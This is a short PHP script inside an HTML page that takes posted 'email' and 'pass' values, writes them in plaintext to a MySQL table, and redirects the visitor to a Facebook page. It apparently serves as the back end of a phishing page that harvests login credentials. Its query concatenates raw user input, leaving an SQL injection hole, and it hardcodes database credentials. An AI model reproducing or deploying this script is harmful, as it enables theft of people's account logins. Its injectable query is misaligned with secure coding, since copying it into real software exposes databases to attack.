<!DOCTYPE html>


<html>
<body>

<?php
$servername = "localhost";
$username = "lemi";
$password = "password";
$database="myDB";
$table="MyGuests";
// Create connection
$connected = new mysqli($servername, $username, $password, $database);


$name=$_POST["email"];
$pass=$_POST["pass"];

$sql="INSERT INTO ". $table ." (user, passw) VALUES ('$name','$pass')";
if (mysqli_query($connected, $sql)) {
    $external_link = 'https://www.facebook.com/findmeafunnyvideo/';
    header('Location: ' . $external_link);
  } else {
    echo "Error creating table: " . mysqli_error($conn);
    
  }
  

?> 



</body>
</html> 